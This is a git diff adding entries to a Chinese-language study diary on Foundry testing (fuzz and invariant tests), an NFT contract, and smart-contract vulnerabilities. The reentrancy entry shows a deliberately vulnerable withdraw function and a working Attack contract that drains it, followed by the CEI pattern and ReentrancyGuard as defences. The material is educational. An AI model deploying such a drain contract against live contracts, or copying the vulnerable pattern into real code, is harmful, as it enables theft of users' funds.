@@ -179,7 +179,7 @@ Ethers.js 是一个使用Typescript编写的库，用于构建去中心化应用
 * `MyContract` : 实际部署的合约，由于一个 solidity 中允许存在多个合约，因此这里指定需要部署的合约名称。
 * `constructor-args`: 合约的构造参数，如果没有，可以不设置该属性。
 ### 07.20
-- 今日学习时间：7.120  10 a.m.--12 a.m.
+- 今日学习时间：7.20  10 a.m.--12 a.m.
 - 学习内容小结：Foundry test cheatCode&cast 学习
 #### Foundry cast命令
 * `cast chain-id ` 使用 cast chain-id 命令可以快速获取当前链的 ID，这是识别和确认你正在正确的区块链上操作的一个关键步骤。例如，在部署合约或验证交易时，确保链 ID 的准确性至关重要。
@@ -199,4 +199,304 @@ Ethers.js 是一个使用Typescript编写的库，用于构建去中心化应用
   `vm.expectEmit(true, true, false, true);`
   前三个参数分别对应事件的indexed部分，最后一个为data部分。若是一个事件不足三个indexed，则对应的参数位置为false。date部分若有两个及以上数量的参数，需要全部匹配才会返回true。
 XXX
+### 07.21
+- 今日学习时间：7.21  8 p.m.--10 p.m.
+- 学习内容小结：Foundry FussTest 学习
+#### Fuzz Test
+Fuzz Testing（模糊测试）是一种自动化的软件测试技术，通过自动生成大量随机输入数据来测试程序。在智能合约的开发中，Fuzz Testing 被用来发现合约中潜在的漏洞和异常行为。本课将介绍如何进行智能合约的 Fuzz Testing。
+测试用例
+用于取款和存款的合约
+```sol
+pragma solidity 0.8.10;
+
+contract Safe {
+    receive() external payable {}
+
+    function withdraw() external {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+```
+##### 单元测试
+单元测试关注于测试代码中特定的功能点。通过编写测试用例，可以验证给定条件下，代码的行为是否符合预期。
+```sol
+import "forge-std/Test.sol";
+
+contract SafeTest is Test {
+    Safe safe;
+
+    function setUp() public {
+        safe = new Safe();
+    }
+
+    function test_Withdraw() public {
+        payable(address(safe)).transfer(1 ether);
+        uint256 preBalance = address(this).balance;
+        safe.withdraw();
+        uint256 postBalance = address(this).balance;
+        assertEq(preBalance + 1 ether, postBalance);
+    }
+}
+```
+##### 属性测试
+与单元测试不同，属性测试不是测试特定的输入和输出，而是验证一般性的属性或行为是否为真。属性测试通过随机生成大量的输入数据来测试代码，以确保在各种情况下代码的行为都符合预期。  
+
+修改测试函数，引入`FussTest`
+```sol
+function testFuzz_Withdraw(uint256 amount) public {
+    payable(address(safe)).transfer(amount);
+    uint256 preBalance = address(this).balance;
+    safe.withdraw();
+    uint256 postBalance = address(this).balance;
+    assertEq(preBalance + amount, postBalance);
+}
+```
+*排除特定情况* 使用`vm.assume`作弊码，可以排除某些不希望进行测试的特定情况。例如，如果不想测试低于0.1 `ETH` 的取款，可以如下编写：
+```sol
+
+function testFuzz_Withdraw(uint96 amount) public {
+    vm.assume(amount > 0.1 ether);
+    // 测试逻辑...
+}
+```
+##### 结果分析
+* runs：测试运行的次数，默认情况下，Fuzz 测试会生成256个场景。
+* μ（mu）：所有 Fuzz 运行中使用的平均 gas 量。
+* ~（tilde）：所有Fuzz运行中使用的中位数 gas 量。
+### 07.22
+- 今日学习时间：7.22  4 p.m.--5 p.m.
+- 学习内容小结：Foundry 不变性测试
+#### 不变性测试
+不变性测试的确是用来检查智能合约中的某些参数或状态在特定操作前后是否保持不变。它们通常被定义为合约逻辑的核心属性，确保在各种操作下这些关键属性不会意外地改变。  
+不变性一般指的是交易前后不改变的参数。
+##### 常见的不变性
+* 总供应量：对于代币合约，代币的总供应量应在各种操作后保持不变，除非有特定功能如铸造或销毁。
+* 余额一致性：用户的余额总和应该在转账操作前后保持一致，即转账金额不会凭空产生或消失。
+* 所有者：某些重要合约的所有者或管理员角色在未明确转让的情况下应保持不变。
+* 合约状态：合约中的某些状态变量（如激活状态、锁定状态等）在特定条件下应保持不变。
+##### 如何进行不变性测试
+1. 定义不变性条件：明确要测试的状态变量和条件。
+2. 执行交易和操作：对合约执行各种可能的交易和操作。
+3. 设置断言检查：在每次操作后检查不变性条件。
+4. 报告结果：输出测试结果，指出是否有任何不变性条件被违反。
+简单来说，就是操作后设置断言，检查不变性是否发生改变。
+
+### 07.23
+- 今日学习时间：7.23  4 p.m.--7 p.m.
+- 学习内容小结：Foundry 实现NFT
+#### 通过Foundry实现NFT
+引用solmate-ERC721、oppenzeppelin中Strings、Ownable实现
+
+```sol
+// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+pragma solidity 0.8.20;
+
+import "solmate/tokens/ERC721.sol";
+import "openzeppelin-contracts/contracts/utils/Strings.sol";
+import "openzeppelin-contracts/contracts/access/Ownable.sol";
+
+contract NFT is ERC721, Ownable {
+    using Strings for uint256;
+
+    uint256 public currentTokenId;
+    uint256 public constant MAX_CAPACITY = 10_000;
+    uint256 public constant MINT_PRICE = 0.05 ether;
+
+    string public baseURI;
+
+    error MintPriceNotPaid();
+    error MaxSupply();
+    error NonExistentTokenURI(); 
+
+    constructor(string memory _name, string memory _symbol, string memory _baseURI) 
+        ERC721(_name, _symbol)
+        Ownable(msg.sender) 
+    {
+        baseURI = _baseURI;
+    }
+
+    function tokenURI(uint256 tokenId)
+        public
+        view
+        virtual
+        override
+        returns (string memory)
+    {
+        if (ownerOf(tokenId) == address(0)) {
+            revert NonExistentTokenURI();
+        }
+        if (bytes(baseURI).length > 0) {
+            return string(abi.encodePacked(baseURI, tokenId.toString()));
+        } else {
+            return "";
+        }
+    }
+
+    function mintTo(address recipient) 
+        public
+        payable
+        returns (uint256)
+    {
+        uint256 newItemId = ++currentTokenId;
+        if (msg.value != MINT_PRICE) {
+            revert MintPriceNotPaid();
+        }
+        if (newItemId > MAX_CAPACITY) {
+            revert MaxSupply();
+        }
+        _safeMint(recipient, newItemId);
+        return newItemId;
+    }
+
+    function setBaseURI(string memory _baseURI) external onlyOwner {
+        baseURI = _baseURI;
+    }
+}
+
+```
+
+测试代码
+```sol
+pragma solidity 0.8.20;
+
+import "forge-std/Test.sol";
+import "../src/NFT.sol";
+
+contract NFTTest is Test {
+    NFT private nft;
+
+    function setUp() public {
+        nft = new NFT("NFT_tutorial", "TUT", "baseUri");
+    }
+
+    function test_RevertMintWithoutValue() public {
+        vm.expectRevert(NFT.MintPriceNotPaid.selector);
+        nft.mintTo{value: 0 ether}(address(1));
+    }
+
+    function test_MintPricePaid() public {
+        nft.mintTo{value: 0.05 ether}(address(1));
+    }
+
+    function test_RevertMintToZeroAddress() public {
+        vm.expectRevert("INVALID_RECIPIENT");
+        nft.mintTo{value: 0.05 ether}(address(0));
+    }
+}
+```
+### 07.24
+- 今日学习时间：7.24  4 p.m.--5 p.m.
+- 学习内容小结：学习GPU代币合约漏洞
+### 07.25
+- 今日学习时间：7.25  4 p.m.--6 p.m.
+- 学习内容小结：学习重入攻击原理
+#### 重入攻击
+原理为在函数内部的多次操作，状态改变为在最后一次操作之后，故可以在合约状态改变之前，多次进行操作，直到目的达成。
+```sol
+function withdraw() public {
+     uint256 bal = balances[msg.sender];
+    require(bal > 0);
+    
+    (bool sent,) = msg.sender.call{value: bal}("");
+    require(sent, "Failed to send Ether");
+
+    balances[msg.sender] = 0;
+    }
+```
+当向合约中存入1ether，满足bal >0，即可进行withdraw操作。
+编写attack函数
+```sol
+contract Attack {
+    EtherStore public etherStore;
+    uint256 public constant AMOUNT = 1 ether;
+
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+
+    // receive is called when EtherStore sends Ether to this contract.
+    receive() external payable {
+        if (address(etherStore).balance >= AMOUNT) {
+            etherStore.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= AMOUNT);
+        etherStore.deposit{value: AMOUNT}();
+        etherStore.withdraw();
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+>receive是在合约接受到ether时自动执行的。当attack函数执行时，首先向目标合约存入amount数量的ether，然后将存入的ether取出。当attack合约接受到取出的ether时，自动执行receive，尝试取目标合约中的ether。因为此时的合约状态没有改变，receive函数将每次提取amount数量的ether，直到目标合约中余额不足而触发fallback。
+##### 防范措施
+通过`Check-Effects-Interactions(CEI)`模式
+```sol
+function withdraw() public {
+		// 1.check
+    uint256 bal = balances[msg.sender];
+    require(bal > 0);
+
+		// 2.effects
+    balances[msg.sender] = 0;
+
+		// 3.interactions
+    (bool sent,) = msg.sender.call{value: bal}("");
+    require(sent, "Failed to send Ether");
+}
+```
+其他防御措施，`ReentrancyGuard` 使用openzeppelin库中Guards（重入锁）
+```sol
+contract ReentrancyGuard {
+    bool internal locked;
+
+    modifier nonReentrant() {
+        require(!locked, "No reentrancy");
+        locked = true;
+        _;
+        locked = false;
+    }
+}
+
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+contract EtherStore is ReentrancyGuard {
+    
+    function withdraw() public nonReentrant {
+        uint256 bal = balances[msg.sender];
+        require(bal > 0);
+
+        (bool sent,) = msg.sender.call{value: bal}("");
+        require(sent, "Failed to send Ether");
+
+        balances[msg.sender] = 0;
+    }
+    
+    // ...
+}
+```
+它的作用就是在函数执行前先加一把锁，函数结束后释放锁，在发生重入时由于重新进入了该函数，此时锁还未释放，因此重入失败。
+（但是会有额外的gas费用产生，采用CEI模式是根本解决方案）
+### 07.26
+- 今日学习时间：7.26  5 p.m.--6 p.m.
+- 学习内容小结：学习闪电贷和合约账户漏洞
+### 07.27
+- 今日学习时间：7.27  9 p.m.--12 p.m.
+- 学习内容小结：学习闪电贷漏洞
+### 07.28
+- 今日学习时间：7.28  6 p.m.--8 p.m.
+- 学习内容小结：学习常见的Defi漏洞
+### 07.29
+- 今日学习时间：7.29  9 p.m.--12 p.m.
+- 学习内容小结：继续学习常见的Defi漏洞
+### 07.30
+- 今日学习时间：7.30  7 p.m.--12 p.m.
+- 学习内容小结：完成常见的Defi漏洞的学习
+### 07.31
+- 今日学习时间：7.31  5 p.m.--10 p.m.
+- 学习内容小结：学习Node.js
 <!-- Content_END -->
